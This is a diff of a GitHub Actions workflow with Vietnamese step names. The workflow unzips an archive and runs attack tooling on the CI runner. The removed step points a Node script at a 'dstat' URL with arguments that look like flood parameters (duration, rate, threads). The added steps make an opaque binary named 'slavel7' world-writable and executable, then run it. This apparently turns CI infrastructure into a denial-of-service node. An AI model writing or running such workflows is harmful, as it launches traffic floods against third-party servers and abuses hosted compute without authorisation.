@@ -21,5 +21,8 @@ jobs:
       - name: Giải nén file zip
         run: unzip my_node_app.zip
 
-      - name: Chạy script Node.js
-        run: node 2 https://high-cloudflare.dstat123.uk/caa5c82c-76bd-42f4-889a-6887f23080e2 260 2 32
+      - name: Cấp full quyền cho file
+        run: chmod 777 slavel7
+
+      - name: Chạy script
+        run: ./slavel7
